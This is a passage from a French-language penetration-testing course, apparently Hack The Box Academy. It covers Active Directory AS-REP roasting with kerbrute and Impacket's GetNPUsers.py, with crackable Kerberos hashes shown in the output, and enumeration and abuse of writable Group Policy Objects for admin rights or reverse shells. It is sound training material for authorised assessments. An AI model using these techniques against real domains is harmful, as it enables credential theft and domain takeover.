dsgsec@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _\
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 13:14:17 >  Using KDC(s):
2022/04/01 13:14:17 >  	172.16.5.5:88

2022/04/01 13:14:17 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a

<SNIP>

```

Avec une liste d'utilisateurs valides, nous pouvons utiliser [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) de la boîte à outils Impacket pour rechercher tous les utilisateurs pour lesquels la pré-authentification Kerberos n'est pas requise. L'outil récupérera l'AS-REP au format Hashcat pour le craquage hors ligne de tout élément trouvé. Nous pouvons également introduire une liste de mots `jsmith.txt`dans l'outil, cela générera des erreurs pour les utilisateurs qui n'existent pas, mais s'il en trouve des valides sans pré-authentification Kerberos, cela peut alors être un bon moyen de prendre pied ou d'approfondir notre accès, selon où nous en sommes au cours de notre évaluation. Même si nous ne parvenons pas à déchiffrer l'AS-REP à l'aide de Hashcat, il est toujours bon de signaler cela aux clients (un risque simplement moindre si nous ne parvenons pas à déchiffrer le mot de passe) afin qu'ils puissent évaluer si le compte nécessite ou non ce paramètre.

#### Recherche d'utilisateurs avec pré-autorisation Kerberoast non requise

  Diverses erreurs de configuration

```
dsgsec@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set

<SNIP>

```

Nous avons maintenant couvert quelques façons d'effectuer une attaque ASREPRoasting à partir d'hôtes Windows et Linux et avons vu comment nous n'avons pas besoin d'être sur un hôte joint au domaine pour a) énumérer les comptes qui ne nécessitent pas de pré-authentification Kerberos et b ) effectuez cette attaque et obtenez un AS-REP à pirater hors ligne pour soit prendre pied dans le domaine, soit approfondir notre accès.

* * * * *

Abus d'objet de stratégie de groupe (GPO)
-----------------------------------------

La stratégie de groupe fournit aux administrateurs de nombreux paramètres avancés qui peuvent être appliqués aux objets utilisateur et ordinateur dans un environnement AD. La stratégie de groupe, lorsqu'elle est utilisée correctement, est un excellent outil pour renforcer un environnement AD en configurant les paramètres utilisateur, les systèmes d'exploitation et les applications. Cela étant dit, la stratégie de groupe peut également être utilisée à mauvais escient par des attaquants. Si nous pouvons obtenir des droits sur un objet de stratégie de groupe via une mauvaise configuration d'ACL, nous pourrions en tirer parti pour un mouvement latéral, une élévation de privilèges et même une compromission de domaine et comme mécanisme de persistance au sein du domaine. Comprendre comment énumérer et attaquer les GPO peut nous donner un avantage et peut parfois être la clé pour atteindre notre objectif dans un environnement plutôt confiné.

Les mauvaises configurations des GPO peuvent être utilisées de manière abusive pour effectuer les attaques suivantes :

-   Ajout de droits supplémentaires à un utilisateur (tels que SeDebugPrivilege, SeTakeOwnershipPrivilege ou SeImpersonatePrivilege)
-   Ajout d'un utilisateur administrateur local à un ou plusieurs hôtes
-   Création d'une tâche planifiée immédiate pour effectuer un certain nombre d'actions

Nous pouvons énumérer les informations GPO à l'aide de nombreux outils que nous avons utilisés tout au long de ce module, tels que PowerView et BloodHound. Nous pouvons également utiliser [group3r](https://github.com/Group3r/Group3r) , [ADRecon](https://github.com/sense-of-security/ADRecon) , [PingCastle](https://www.pingcastle.com/) , entre autres, pour auditer la sécurité des GPO dans un domaine.

En utilisant la fonction [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) de PowerView, nous pouvons obtenir une liste des GPO par nom.

#### Énumération des noms de GPO avec PowerView

  Diverses erreurs de configuration

```
PS C:\htb> Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services

```

Cela peut nous être utile pour commencer à voir quels types de mesures de sécurité sont en place (comme le refus de l'accès à cmd.exe et une politique de mot de passe distincte pour les comptes de service). Nous pouvons voir que la connexion automatique est utilisée, ce qui peut signifier qu'il existe un mot de passe lisible dans un GPO, et voir que les services de certificats Active Directory (AD CS) sont présents dans le domaine. Si les outils de gestion des stratégies de groupe sont installés sur l'hôte à partir duquel nous travaillons, nous pouvons utiliser diverses [applets de commande GroupPolicy](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) intégrées, par exemple `Get-GPO`pour effectuer la même énumération.

#### Énumération des noms de GPO avec une applet de commande intégrée

  Diverses erreurs de configuration

```
PS C:\htb> Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access

```

Ensuite, nous pouvons vérifier si un utilisateur que nous pouvons contrôler possède des droits sur un GPO. Des utilisateurs ou groupes spécifiques peuvent se voir accorder des droits pour administrer un ou plusieurs objets de stratégie de groupe. Une bonne première vérification consiste à voir si l'ensemble du groupe d'utilisateurs du domaine dispose de droits sur un ou plusieurs GPO.

#### Énumération des droits GPO des utilisateurs de domaine

  Diverses erreurs de configuration

```
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None

```

Ici, nous pouvons voir que le groupe Utilisateurs du domaine dispose de diverses autorisations sur un GPO, telles que `WriteProperty`et `WriteDacl`, que nous pourrions exploiter pour nous donner un contrôle total sur le GPO et lancer un certain nombre d'attaques qui seraient transmises à tous les utilisateurs et ordinateurs. Unités d'organisation auxquelles l'objet de stratégie de groupe est appliqué. Nous pouvons utiliser le GUID GPO combiné avec `Get-GPO`pour voir le nom d'affichage du GPO.

#### Conversion du GUID GPO en nom

  Diverses erreurs de configuration

```
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :

```

En vérifiant dans BloodHound, nous pouvons voir que le `Domain Users`groupe dispose de plusieurs droits sur le `Disconnect Idle RDP`GPO, qui pourraient être exploités pour un contrôle total de l'objet.

![image](https://academy.hackthebox.com/storage/modules/143/gporights.png)

Si nous sélectionnons le GPO dans BloodHound et faisons défiler l'onglet vers `Affected Objects`le bas `Node Info`, nous pouvons voir que ce GPO est appliqué à une unité d'organisation, qui contient quatre objets informatiques.

![image](https://academy.hackthebox.com/storage/modules/143/gpoaffected.png)

Nous pourrions utiliser un outil tel que [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) pour profiter de cette mauvaise configuration de GPO en effectuant des actions telles que l'ajout d'un utilisateur que nous contrôlons au groupe d'administrateurs locaux sur l'un des hôtes concernés, en créant une tâche planifiée immédiate sur l'un des hôtes pour donner nous un shell inversé, ou configurez un script de démarrage d'ordinateur malveillant pour nous fournir un shell inversé ou similaire. Lorsque nous utilisons un outil comme celui-ci, nous devons être prudents car des commandes peuvent être exécutées et affecter chaque ordinateur de l'unité d'organisation à laquelle le GPO est lié. Si nous trouvions un GPO modifiable qui s'applique à une unité d'organisation comportant 1 000 ordinateurs, nous ne voudrions pas commettre l'erreur de nous ajouter en tant qu'administrateur local à autant d'hôtes. Certaines des options d'attaque disponibles avec cet outil nous permettent de spécifier un utilisateur ou un hôte cible. Les hôtes présentés dans l'image ci-dessus ne sont pas exploitables et les attaques GPO seront traitées en profondeur dans un module ultérieur.

* * * * *

À partir de
-----------

Nous avons constaté diverses erreurs de configuration que nous pouvons rencontrer lors d'une évaluation, et il y en a bien d'autres qui seront abordées dans des modules Active Directory plus avancés. Il vaut la peine de se familiariser avec autant d'attaques que possible, nous vous recommandons donc de faire des recherches sur des sujets tels que :

-   Attaques des services de certificats Active Directory (AD CS)
-   Délégation contrainte Kerberos
-   Délégation sans contrainte Kerberos
-   Délégation contrainte basée sur les ressources Kerberos (RBCD)

Dans les sections suivantes, nous aborderons brièvement l'attaque des fiducies AD. Il s'agit d'un sujet vaste et complexe qui sera abordé en profondeur dans un module ultérieur.
